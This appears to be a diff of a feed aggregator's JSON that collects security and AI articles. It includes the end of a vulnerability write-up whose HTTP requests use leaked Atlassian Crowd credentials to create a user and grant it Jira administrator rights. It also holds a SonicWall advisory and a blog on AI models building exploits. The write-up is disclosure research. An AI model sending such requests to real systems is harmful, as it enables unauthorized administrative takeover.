<http://localhost:8095/crowd/>\nsession.isauthenticated session.isauthenticated\nsession.tokenkey session.tokenkey\nsession.validationinterval 2\nsession.lastvalidation session.lastvalidation\nThis allowed us to confirm that the config file stores the following information:\nThe application name.\nThe password for the application, in plaintext.\nThe Crowd URL.\nWith those leaked, we can try to access Crowd directly and see what we can achieve.\nAuthors' note: Crowd configuration allows you to specify a whitelist of IP addresses that can access it. Such a configuration may make this attack scenario much harder, as you would need to pivot through arbitrary machines or use SSRF-like capabilities of Jira, Confluence, or Bitbucket to reach Crowd directly. It is probably safe to assume that in real environments you will find both very permissive and locked-down Atlassian Crowd installations.\nAccessing Atlassian Crowd: Impact\nWhen you access Atlassian Crowd directly with the leaked credentials, it is basically game over. Sounds logical: you are accessing the identity management solution as an administrator of the application.\nYou can use the direct access to:\nCreate new users.\nModify user privileges.\nAnd much more.\nFor instance, you can try this by sending the following request:\nGET /crowd/rest/usermanagement/1/search?entity-type=user&max-results=1000 HTTP/1.1\nHost: jira.lab.local:8095\nAuthorization: Basic eW91cjpjcmVkZW50aWFscw==\nIn the response, you will receive the list of existing users.\nYou can of course do something much more malicious, like creating a new user:\nPOST /crowd/rest/usermanagement/1/user HTTP/1.1\nHost: jira.lab.local:8095\nContent-Type: application/json\nContent-Length: 194\nAuthorization: Basic eW91cjpjcmVkZW50aWFscw==\n{\n\"name\": \"watchTowrPoC\",\n\"active\": true,\n\"first-name\": \"Evil\",\n\"last-name\": \"Admin\",\n\"display-name\": \"watchTowrPoC\",\n\"email\": \"watchTowrPoC@attacker.test\",\n\"password\": {\"value\": \"1PocPa$$wd23\"}\n}\nAnd then add this user to the\njira-administrators\ngroup:\nPOST /crowd/rest/usermanagement/1/group/user/direct?groupname=jira-administrators HTTP/1.1\nHost: jira.lab.local:8095\nAccept: application/json\nContent-Type: application/json\nContent-Length: 24\nAuthorization: Basic eW91cjpjcmVkZW50aWFscw==\n{\"name\": \"watchTowrPoC\"}\nYou can be proud of yourself, pal. You just got promoted to Jira Administrator.\nFile Read to Jira Administrator Through Crowd: Full PoC\nWe would not be ourselves if we did not implement the entire chain in a single Python PoC, just to make it look nice.\nDetection Artefact Generator\nAs always, we have created a Detection Artefact Generator, which you can use to check whether an instance is vulnerable. It can be found\nhere\n, working for the following Atlassian products:\nJira.\nConfluence.\nBitbucket.\nA sample run against a vulnerable instance looks like this:\nSpeak soon.",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "rss",
-      "content_source_url": "https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/",
-      "content_chars": 16325,
-      "content_sha256": "f011df472600a363765a73b2259cc647783cad13e8c7c31411092f6469f7be85",
-      "content_fetched_at": "2026-10-07T00:34:38.212206+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "watchTowr Labs",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:96a11b4350eb1c7a",
-      "kind": "publish",
-      "text": "sonicwall-advisory published: SonicWall SMA1000 Series Appliances Affected By Multiple Vulnerabilities",
-      "actor": "sonicwall-advisory",
-      "actor_url": "https://psirt.global.sonicwall.com/",
-      "created_at": "2026-10-06T09:44:00+00:00",
-      "html_url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0017",
-      "title": "SonicWall SMA1000 Series Appliances Affected By Multiple Vulnerabilities",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "<p>\n</p><p><span style=\"font-size: 11pt; color: rgb(181, 99, 8);\">1) CVE-2026-102255 - Pre-authentication SSRF via unintended forward-proxy </span></p><p>A Pre-authentication SSRF vulnerability exists in the SMA1000 Appliance Work Place interface due to an unintended alternate access path. By abusing this path, a remote unauthenticated attacker could potentially exploit this vulnerability to direct the appliance to issue requests on their behalf and reach internal functionality and perform unauthorized operations.<br></p><p>CVSS Score: 10.0<br>\nCVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br>\nCWE-918: Server-Side Request Forgery (SSRF)<br>\nCWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n</p><p>\n</p><p><span style=\"font-size: 11pt; color: rgb(181, 99, 8);\">2) CVE-2026-102256 - Post-authentication Remote Code Execution (RCE) Vulnerability</span></p><p>Post-authentication Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') vulnerability has been identified in the SMA1000 appliance which in specific conditions could potentially enable a remote authenticated attacker as administrator to execute arbitrary OS commands, resulting in remote code execution.\n<br></p><p>CVSS Score: 7.8<br>\nCVSS Vector: CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H<br>\nCWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n</p><p><span style=\"font-size: 11pt; color: rgb(181, 99, 8);\">3) CVE-2026-102257 - Post-authentication Zip Slip Vulnerability </span></p><p>A Zip Slip vulnerability in the in the SMA1000 Appliance Management Console (AMC) interface allows an attacker to extract files outside the intended destination directory using a specially crafted archive, resulting in remote code execution.<br></p><p>CVSS Score: 7.2<br>\nCVSS Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H<br>\nCWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n</p><p>\n</p><p><span style=\"font-size: 11pt; color: rgb(181, 99, 8);\">4) CVE-2026-102258 - Post-authentication Stored Cross-Site Scripting (XSS) Vulnerability</span></p><p>Post-authentication Stored Cross-Site Scripting (XSS) vulnerability has been identified in the SMA1000 Appliance Management Console (AMC) which in specific conditions could potentially enable a remote authenticated attacker as administrator to store and potentially execute arbitrary JavaScript code in the Appliance Management Console (AMC).\n<br></p><p>CVSS Score: 5.5<br>\nCVSS Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:N<br>\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n</p><p></p><p>\n</p>\n<p>SonicWall strongly advises users of the SMA1000 series appliances to upgrade to the mentioned fixed release version to address these vulnerabilities.<br> <br>There is currently no evidence any of the vulnerabilities addressed in this release are being exploited in the wild. Please note that SSL-VPN running on SonicWall Firewall products are not affected by this vulnerability.</p>\nCVE: CVE-2026-102255, CVE-2026-102256, CVE-2026-102257, CVE-2026-102258\nLast updated: Oct. 6, 2026, 9:44 a.m.",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "rss",
-      "content_source_url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0017",
-      "content_chars": 3201,
-      "content_sha256": "d9eac916ddba7b45a609a3ddc8cf5a79ff31fe79d1e8235740179ccf88ab5d47",
-      "content_fetched_at": "2026-10-07T00:34:37.930618+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "SonicWall Security Advisories",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:944fbfe049ce5051",
-      "kind": "publish",
-      "text": "yage-share published: 玻璃杯从深度图里消失之后：机器学习拆任务的取舍",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-10-06T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/ml-stage-vs-endtoend-glass-20261006.html",
-      "title": "玻璃杯从深度图里消失之后：机器学习拆任务的取舍",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "模型架构\n科研与技术前沿\nAI 编程\n把大任务拆成几个小任务、每个环节专门做自己那块再拼起来，还是把整个任务交给一个模型从头训到尾、中间不留死环节，是机器学习里争论多年的分歧。前者的优势是每个环节能单独调试、单独换人；后者的优势是优化的自由度。透明玻璃杯挂不上挂钩、测距图里看不到杯子，后面的机器人实验就是给这两边各打了一个分。文章先看两边各得多少分，再讲为什么拆分会输、输在哪，什么时候拆分依然是对的，最后给出判断环节去留的三条判据，帮你在自己的系统里决定一个环节该留还是该拆。\n玻璃杯挂不上挂钩，因为测距相机先把杯子看丢了\n一台七自由度的机械臂站在工作台前。夹爪把一只透明玻璃杯从台面上拎起来，慢慢往挂钩上方送。杯子到了挂钩前面，机械臂偏离了位置，杯把和挂钩错开，杯子挂空了，这轮任务失败。\n机械臂想把杯子挂稳，往往需要一个专门测量物体远近的传感器，也就是常说的\nRGB-D\n相机。这类相机大多靠红外光工作：朝物体投射特定图案，再看图案反射回来的形变，算出图像里每个像素离镜头的距离。\n但玻璃天生透明。投射的红外光穿过杯体，在弯曲的边缘折射散开，传感器收不到能对上号的反射光。算出的距离图里，玻璃杯所在的位置没有读数，本该有杯子的地方一片空白。\n前端传感器把关键数据弄丢之后，后方的动作策略网络只能对着残缺的输入硬猜，机械爪的末端定位自然产生偏差。用这类相机看玻璃，典型的问题总是反复出现：看不准杯壁在哪里、套不进把手、找不到半空中的杯子。这是光学测距原理决定的，\n独立计量实测\n也把边界量了出来：平板玻璃影响不大，折射体积加暗背景才让读数大片失效。英特尔\nRealSense\n社区的技术支持\n指出，凡在可见光波段透明的材质，在基于立体的测距算法里也必然透明，真想测量只能人工喷涂显影粉末。微软在处理\nAzure\nKinect\n的同类故障反馈\n时，同样把半透明物体的深度塌陷判定为设计使然，一切符合预期（By\nDesign: Everything is working as expected）。\n玻璃杯在彩色镜头里轮廓完整，在深度图里整块消失。\n这种前后两段的设计，问题出在传感器这道中间步骤上：它要先把镜头收到的连续光线转成一张定死的距离网格。透明物体让测距丢了读数，传给动作网络的就只剩残缺数据，下游也没机会把动作失败的教训反馈回去修正前端读数。\n同一台机械臂，只换输入，成功率差了近四倍\n算距离的硬件遇到玻璃就失效，干脆把这一步整个删掉，让神经网络直接看两只镜头拍到的原始画面，它自己能不能摸出远近？西北大学和斯坦福大学的一组人在真实机械臂上做了受控对照（\n论文\n，\n项目主页\n）。他们搭了个实验台架，主角同样是一台七自由度的机械臂，在工作台边缘和机械臂手腕上分别装了相机。每台相机其实由两颗相距六点三厘米的标准光学镜头组成，两只眼睛同时从略微不同的角度拍照。这两颗镜头出厂时本来就能自己算出一张距离图，但这组实验故意不用它算好的距离，而是把左右两只眼睛拍到的原始彩色画面直接送给策略网络。\n为了做对照，他们也保留了传统做法：把传感器测出的距离反算成空间里的三维坐标点，也就是常说的点云。评测任务一共设计了五种：把香蕉装进盒子、把吐司精准插进烤箱的卡槽，以及把塑料杯、不锈钢杯和玻璃杯分别挂到杯架上。每个任务先由真人操作示范两百条轨迹，用来训练扩散策略网络。正式评测时，物体的摆放位置每次都会随机变换，每个任务都在真机上实打实地运行二十次（20\ntrials）。\n在机械臂硬件相同、示教数据相同、模型参数规模也相当的前提下，仅仅改变喂给模型的数据形式，就能带来近乎四倍的成功率差异。各组成绩：把左右两张画面送入网络、并在两个视角间做注意力融合的一组拿到59%；同样给这两张画面，但只是在通道上直接拼接、不让两重视角做交互，成功率落到45%；如果只给单镜头拍的一张普通彩色照片，成功率是43%；如果在单张彩色照片旁边附带一张硬件算出的距离图，成绩反而掉到41%；表现最差的是把测出来的三维空间点塞进专门处理点云的网络，成功率只剩14%。\n这篇论文目前还在学术会议审稿阶段（\n投稿页\n），代码库也没有正式公开，社区也没有第三方的独立复现结果。云端算力服务商Lambda列在作者机构中，作者在线程里向其表达了算力赞助的感谢（\n作者在线程里致谢\n），该公司的技术博客也发布了相关介绍（\nLambda\n博客\n）。每种方法在五个任务上各测二十次，合计一百次真机尝试，样本不算大；按二项分布估算置信区间，范围并不算窄，这组数据给的是明确的走向，不是精确的数值。\n拆开还是贯通\n机械臂在现实里做动作，传统工程思路默认前端要先算出远近。整个系统拆成两个模块：前端管测距、在三维空间里重建坐标，后端拿坐标推动作，接口处把数据拼上。流程里那些不参与反向传播的固定步骤或硬件计算，会把梯度在接口处截断。前端测距出了偏差，后端的策略网络只能接收失真数据，前端也听不到动作失败的反馈。\n每种输入在真机上各测二十次、共五个任务，合计一百次。其中，左右视角注意力融合方案取得了59%的成功率。通道直接拼接方案降至45%，输入单张彩色照片为43%，单张彩色照片附加硬件距离图降至41%，而输入空间点云的方案只有14%。点云方案垫底的原因在于真实环境测得的距离读数本身就存在空洞和噪点，转换成空间坐标后还需要进行裁切、降采样和坐标对齐等手工预处理。论文的作者指出，这套预处理稍有不慎，整个策略的成功率会直接归零。\n45% 和 59%\n的差距体现了信息组织方式的差异。通道拼接与跨视角注意力方案有相似的模型参数，接收了相同的原始画面。在\n45% 的方案中，两个镜头提取的特征在进入决策层之前没有任何交互；59%\n的网络在没有人工深度标注的情况下，通过动作损失的反向传播，在左右画面的对应像素之间实现了自动几何关联。\n五种输入方式的成绩从 59 到 14\n依次排开，双目融合最高。\n后续的消融与探测实验印证了这种表征的形成过程。把右侧画面换成左侧画面的复制图，机械臂的成绩立刻大幅下滑。研究人员使用线性探针解析模型训练后的内部特征，可以稳定提取机械爪与目标物体的相对空间距离，而训练前的网络权重无法读取该信息。在未人工指定三维坐标格式的前提下，神经网络通过端到端动作优化自行建立了适合操作的空间表征。\n双目端到端策略的优势并不代表显式几何计算没有意义。输入数据足够干净的场景里，先算三维坐标依然有工程竞争力。在针对操作任务的\nOBSBench基准\n评测中，简单的点云策略经常优于纯图像或图像叠加深度图的配置。英伟达关于\n点云鲁棒性的对比研究\n也显示，面对光照变化或视角晃动，基于空间坐标的模型展现出更强的抗干扰表现。在仿真环境中提供无噪声的理想距离时，依赖空间坐标的控制策略在多数任务中能达到九成以上的成功率。在灵巧手抓取实验\nDextrAH-RGB\n中，双目端到端策略与基于深度的分段策略整体打平；在具体装箱测试中，十一个物体里三个由深度方案胜出，其余测试打平。\n直接使用双目输入在实践中存在限制。双目相机需要精确的时间同步和标定，镜头的物理基线导致夹爪靠近物体时出现无视差盲区。面对透明材质左右视图的特征匹配可能不准。在二十次挂玻璃杯测试中，注意力融合的双目模型仅成功三次。\n贯通训练和拆成几段，不必站队。某个组件要不要单独拎出来，要看它在真实数据上出错的概率，以及后面的组件能不能利用冗余信息自己纠偏。环境干净、传感器稳的时候，把相关组件拆开调试和替换都更简单；遇到反光、折射等真实干扰，专门管测距的环节反复失准，打通梯度让整个网络一起学，往往比拆分更划算。\n拆分何时胜出\n早年在一家做工业物联网系统的公司，有个项目按传统思路拆成几个子模型分别建模，估摸要数月；改用单个模型从头训到尾，两天拿到可用原型。拆出来的子模块在现场工业数据面前本来就不稳，端到端训练直接拿最终目标驱动特征提取，脆弱的人工接口不要了。这与机器人实验互为补充：前端环节若在现场数据中稳定性存疑，贯通训练可展现效率优势；前端环节若能持续输出高保真特征，模块化拆分则利于工程迭代。\n检查系统架构时，几个具体问题能帮上忙。这个模块在生产环境里出错的频率做过测试吗？它输出残缺或失真的中间结果时，下一个模块有没有别的信号能把信息补上？前后模块在工程上接得起来吗？模块本身稳定、下游有自己纠偏的余地，或者工程条件不支持端到端联合训练，独立模块就留着；前端故障率高、下游又吸收不了偏差，就该考虑把梯度接通。\n每条管线都在付出同样的拆分代价\n同样的取舍也发生在机器人之外。检索增强系统把长文档切成固定长度的片段、再用相似度阈值拦截，检索和推理在这里隔断：下游模型再强，也补不回前置召回时漏掉的关键细节。智能体系统在规划与执行之间插进写死规则的状态机，真实环境的反馈就到不了规划模型。早年的自然语言处理与计算机视觉放弃人工特征、改由深层网络自己学出表示，也是同一个道理。\n机械臂在玻璃杯挂钩前落空的现象，流程里安插的每个不参与训练的环节，都在压缩全局优化能探索的空间。决定拆出一个专门环节之前，先实测它在真实场景里的失效率，再算下游能不能自己消化这些误差。",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/ml-stage-vs-endtoend-glass-20261006.html",
-      "content_chars": 3745,
-      "content_sha256": "28b295cb42751a87fe0b67857f88272d7c6b70a903431162527ff5b55ffdb9c8",
-      "content_fetched_at": "2026-10-07T00:33:24.088843+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:6a83ac9535be9e6e",
-      "kind": "publish",
-      "text": "yage-share published: 在大模型上 build：三家大公司替你踩过的坑",
-      "actor": "yage-share",
-      "actor_url": "https://yage.ai/share/",
-      "created_at": "2026-10-06T00:00:00+00:00",
-      "html_url": "https://yage.ai/share/build-vs-buy-enterprise-ai-lessons-20261005.html",
-      "title": "在大模型上 build：三家大公司替你踩过的坑",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "产业与竞争\nAI 产品与平台\n他们花的钱最多，建的却不是模型\n开利是一家历史悠久的美国工业公司，专注于暖通空调领域已经有 110\n年的历史。它拥有约 50,000 名员工。今年 9\n月，在一个行业基础设施会议的圆桌（\n视频\n）上，三家大公司坐到一起，这家公司的首席数据与\nAI 官 Arun Nandi 报了个数：2026 年 1 月至 7 月期间，全公司的 token\n账单增至原来的 8\n倍。这些支出主要用于服务自家产品的边缘设施、软件和数据团队。Arun\n强调账单涨成这样出自刻意安排，那是探索的账单（that is the bill for\ndiscovery… for innovation.）。\n开利买的是模型本身，训练基座这件事，三家谁都没做。稍大一些的是合众银行，全美第五大，70,000\n名员工。有人问首席 AI 官 Prashant Mehrotra\n会不会预训练自己的基座模型，他说不会说死，但今天没有（never say never.\nIt’s not there today.）。110,000\n名员工的商业地产服务机构仲量联行（JLL），其基座模型也完全外包。\n这并不是这三家公司的怪癖。\nMenlo\nVentures\n在 2025 年 11 月做了一个调查，采访了 495\n位美国企业的决策者。数据显示，2024 年企业 AI 项目中有 47%\n是自己搭建，但现在已经变成了 76% 直接采购。在企业大模型 API\n的使用量中，Anthropic、OpenAI 和 Google 占据了\n88%。这批人把底层模型当作日常消耗品，工程力气花在模型之上的那一层。仔细梳理他们在实践中趟出来的路子，主要有四条可以直接对照着抄的作业。\n占位：自建与采购的分界线不在用不用\nAPI，而在模型层作为消耗品采购、工程资产沉淀在模型之上的路由与计费系统\n第一个作业：把换模型当必然事件来设计\n传统企业软件采购，评估时默认一套系统能用上三到五年。可现在头部 AI\n实验室两到四周就推一个新模型，合众银行的采购思路随之调整。Prashant\nMehrotra 说，现在用一个东西的前提是知道能在 12 到 18\n个月窗口期里换掉它（we can have it replaced in a 12 to 18 month\nwindow.）\n这种替换不是纸上谈兵，合众银行内部已经有多个业务项目在半途换掉了整个模型家族。Mehrotra\n认为，基础设施就应该像道路、供水、电力一样天然存在，企业只管在上面盖房子，模型只是新接的水电。开利的\nArun Nandi\n也提醒了另一个更糟的现实风险：新模型可能因为完全不在你控制之内的原因下架，有时甚至不在你这个国家的控制之内。Nandi\n的原文只一句：can be pulled for reasons completely out of your\ncontrol。既然外部供应随时可能发生变动，随时可替换就成了实实在在的风险对冲。写提示词和评测集，就按着下季度要换一家的假设来设计。\n第二个作业：先装计费系统，再谈采用\n当模型变成日常消耗品，企业内部紧接着要面对的就是内部账单如何分摊。合众银行的做法是把\ntoken 成本记到每个员工名下，让他们自己弄清楚该买哪种模型（everybody is\npaying for the token internally… so they know which ones to\nbuy）。光有账单还不够，他们还同步在内部做技能培训，教大家什么任务该配什么规格的模型。Mehrotra\n提醒过，给客户或员工回答一个简单问题，用不着万亿 token 的大模型。\n仲量联行是最明显展示这种思路落地的公司。这家 11\n万员工的公司，技术人员只占约 3,000 人。CTO Yao Morin\n的策略是先给员工很大的 token\n配额，再砍下去。员工一开始不少人抱怨配额少了没法干活，后来自己摸索出了很多省钱的技巧，比如不用一遍遍重传同样的数据。Morin\n的结论是，给约束会让人的创造力冒出来（Human ingenuity is amazing when\nyou give them constraints.）。开利的 Nandi\n对成本的看法也类似：成本不该按 token\n单价算，而该按每个任务带来的业务价值算。所以从一开始就要按任务归因，不要把成本账做糊涂。\n第三个作业：用户手感优先于评测分数\n选模型时，最顺手的依据是各种公开评测的排行榜。但在开利，Arun Nandi\n发现过去八个月到一年中，某些岗位的员工对特定模型家族形成了忠诚度，这和公开评测的结果对不太上，也和\ntoken 价格没有关系（slightly different from what we’ve seen from evals…\ndevoid of all of the cost per\ntoken.）。评测替代不了用户在实际使用中的感受。\n开利的策略是，给不同岗位分流：多步推理用尖端模型，例行问题走便宜的主力模型，开源权重就行。合众银行对同一语音通道给客户的和给员工的延迟、成本都分开；仲量联行则直接做成统一网关，Yao\nMorin\n的关键设计是把响应时限作为独立变量：有些后台任务不需要实时响应，可以拖到算力便宜的时段跑，成本再降一截。Morin\n提醒过，很多前沿厂商没有给企业的 SLA\n承诺，找他们要五个九的可用性，他们会当场笑出来。在真正承流量的路由层，调度决策的依据，正是这些沉淀下来的用户手感。\n第四个作业：把失败率写进预算\n企业在 AI 上大量投入，同时也会经历很多失败。Arun Nandi\n说，他管理这些创新项目的心态更像管基金：组合里两三个高绩效项目，抵得过\n95 个不成功的，少数赢家 offset 掉全部输家。\nGartner\n在 2026 年 1 月的更新指出，截至 2025 年底，至少有 50% 的 GenAI\n项目已在概念验证后终止，无法进入生产。\n451\nResearch（属于标普全球）\n对 1,006\n位欧美企业从业者调查，发现企业明确放弃多数 AI 倡议的比例从 17% 升至\n42%。面对如此高的失败率，开利不去写大段立项文档，而是直接收原型代码做快速分诊。中小团队可以照抄，预设清晰的中止条件，数据不达预期果断砍。\n这家公司的话，要打个折再听\n上面这些做法的出处，也需要交代清楚。这个圆桌讨论是在第三方会议机构\nKisaco Research 举办的\nAI Infra Summit\n上进行的，时间是 2026 年 9 月 16 日。Lambda\n作为算力供应商是会议的白金赞助商，圆桌的主持人是它的首席商业官。目前公开的视频是\n41 分钟的版本，由 Lambda 频道在 9 月 25\n日剪辑发布，现场的原版全场录像则看不到。\nLambda 作为算力供应商，80% 的收入来自大云厂商和头部实验室（\n他本人在访谈里的说法\n），这一点也是需要注意的。它的\n官方博客\n把自建画成硬件地狱，把只买\nAPI\n的路线说成给供应商绑架，推荐的出路全是自家的预留算力。连词也有故事，Mehrotra\n在台上首先说出了 valuemaxxing（先找准价值点，再决定钱花在哪），Lambda\n官方帖随后宣称这个词诞生于自家圆桌。但在\nIBM\n的科技专栏\n里可以发现，早在圆桌三个月前就已经白纸黑字记载过这个词的发明人是\nLambda 的直接竞争对手 Nebius 的首席营收官 Marc Boroditsky。\n抛开商业动机，只看三位高管在各自公司里做的事，他们的做法站得住脚。台上的说法，多数在公开材料里能找到证据（8\n倍账单这类自报数字除外）。比如 Mehrotra 在\n另一次访谈\n里明确说过，银行的天平已经倒向租用模型。开利的\nCTO Markus Klausner 在接受\nFortune\n采访时也证实了，公司的模型策略是所有都要，走前沿商业 API\n加微调开源。仲量联行的模型与公有云架构，在\n官方新闻稿\n和\nMicrosoft\n的客户案例\n里都有说明。真正可以放心照抄的，就是前面这四条工程作业。需要打折看待的，只是\nLambda 替它们包装的概念和结论。",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/build-vs-buy-enterprise-ai-lessons-20261005.html",
-      "content_chars": 3385,
-      "content_sha256": "f57a6c1e885c260f6e08517b57eb2b8a0da1079e02a8c50379d354e743aa4b6a",
-      "content_fetched_at": "2026-10-07T00:33:24.415465+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    }
-  ],
-  "summary": {
+  "source_id": "blog_watch",
+  "collect_date": "2026-10-07",
+  "collect_window": {
+    "start": "2026-10-06T00:00:00+00:00",
+    "end": "2026-10-07T00:32:50.824376+00:00",
+    "hours": 24
+  },
+  "producer": {
+    "name": "sentinel-site",
+    "version": "0.1.0",
+    "run_id": "37552524398",
+    "commit": "39ee25b"
+  },
+  "stats": {
+    "total": 8,
     "by_kind": {
       "publish": 8
     },
@@ -225,9 +31,646 @@
       "sonicwall-advisory": 1,
       "yage-share": 2
     },
+    "failed_lists": [],
+    "sources_ok": 53,
+    "sources_failed": [],
+    "baselines": 0,
+    "via_sources": {
+      "llm": 12,
+      "browser_llm": 11,
+      "rss": 30
+    },
+    "llm_usage": {
+      "model": "deepseek-v4-flash",
+      "requests": 17,
+      "calls": 17,
+      "prompt_tokens": 17770,
+      "completion_tokens": 2958,
+      "total_tokens": 20728,
+      "prompt_cache_hit_tokens": 11645,
+      "prompt_cache_miss_tokens": 6125
+    },
     "by_content_status": {
       "ok": 6,
       "failed": 2
     }
-  }
+  },
+  "items": [
+    {
+      "id": "a:4c3295ea8c2842f0",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
+      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
+      "at": "2026-10-07T00:32:50.824376+00:00",
+      "external_id": "a:4c3295ea8c2842f0",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
+      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
+      "content": "Please enable cookies.\nSorry, you have been blocked\nYou are unable to access\nunknowncheats.me\nWhy have I been blocked?\nThis website is using a security service to protect itself from online attacks. The action you just performed triggered the security solution. There are several actions that could trigger this block including submitting a certain word or phrase, a SQL command or malformed data.\nWhat can I do to resolve this?\nYou can email the site owner to let them know you were blocked. Please include what you were doing when this page came up and the Cloudflare Ray ID found at the bottom of this page.\nCloudflare Ray ID:\na468d036c83dd650\n•\nYour IP:\nClick to reveal\n20.62.204.22\n•\nPerformance & security by\nCloudflare",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "browser",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
+      "content_chars": 725,
+      "content_sha256": "9b0464ae5a5dfffa856bb44cefeed5e6c660a47f09f0b27ccb15a3619d6dfd33",
+      "content_fetched_at": "2026-10-07T00:33:18.811685+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-10-07T00:32:50.824376+00:00",
+      "collected_at": "2026-10-07T00:32:50.824376+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4821312.html",
+          "content_sha256": "9b0464ae5a5dfffa856bb44cefeed5e6c660a47f09f0b27ccb15a3619d6dfd33"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "ok",
+        "content_via": "browser"
+      }
+    },
+    {
+      "id": "a:a71377f72462595f",
+      "who": "cymulate-blog",
+      "who_url": "https://cymulate.com/blog/",
+      "action": "publish",
+      "target": "Project Glasswing: What Anthropic's AI Cyber Evaluations Mean for Security ValidationRead More",
+      "target_url": "https://cymulate.com/blog/project-glasswing/",
+      "text": "cymulate-blog published: Project Glasswing: What Anthropic's AI Cyber Evaluations Mean for Security ValidationRead More",
+      "at": "2026-10-07T00:32:50.824376+00:00",
+      "external_id": "a:a71377f72462595f",
+      "url": "https://cymulate.com/blog/project-glasswing/",
+      "title": "Project Glasswing: What Anthropic's AI Cyber Evaluations Mean for Security ValidationRead More",
+      "content": "Project Glasswing: What Anthropic's AI Cyber Evaluations Mean for Security Validation\nBy:\nAmanda Kegley\nOctober 6, 2026\nProject Glasswing\nis an Anthropic controlled initiative for using advanced AI models to find and help fix vulnerabilities in critical software before similar capabilities become widely available to attackers. It has drawn attention because\nClaude Mythos\nPreview did more than identify suspicious code. It reproduced vulnerabilities, developed exploit components and combined weaknesses into complete attack chains.\nOne point needs clarification: Project Glasswing is a restricted research and defense program, and it's often mistaken for a single benchmark with one score. The program combines live code reviews and partner deployments. Independent evaluations such as CyberGym and ExploitBench add measured evidence of what the model can do. Together, they show how frontier AI models are reshaping both cyber offense and cyber defense.\nFor enterprises, the concern is practical. As AI models improve, attackers may need less time and expertise to discover exploitable weaknesses and develop sophisticated attack chains. Security teams must understand those capabilities, then continuously validate whether their prevention, detection and response controls can withstand the techniques these models help scale. Continuous security validation helps organizations move beyond assumptions and verify that security controls perform effectively against evolving threats.\nKey Takeaways\nProject Glasswing is a controlled research program.\nIt combines live vulnerability discovery, exploit development and coordinated disclosure, while independent benchmarks measure how frontier AI models perform across the cybersecurity lifecycle.\nAI is accelerating cyber offense.\nAdvanced models like Claude Mythos can identify vulnerabilities, reproduce 